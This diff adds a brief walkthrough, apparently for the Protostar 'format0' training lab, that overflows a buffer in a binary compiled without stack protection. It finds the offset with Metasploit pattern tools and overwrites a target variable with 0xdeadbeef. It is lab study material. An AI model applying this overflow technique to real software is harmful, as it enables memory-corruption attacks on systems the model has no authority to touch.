@@ -1,0 +1,20 @@
+Print target content to find how to replace, and recompile
+# gcc -fno-stack-protector -g -o format0 format0.c
+
+# ./format0 `python -c 'print "A" * 100'`
+target:41414141
+Segmentation fault
+
+# ./pattern_create.rb 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+# ./format0 `python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"'`
+target:63413163
+Segmentation fault
+
+# ./pattern_offset.rb 63413163
+64
+
+# ./format0 `python -c 'print "A"*64 + "\xef\xbe\xad\xde"'`target:DEADBEEF
+you have hit the target correctly :)
+
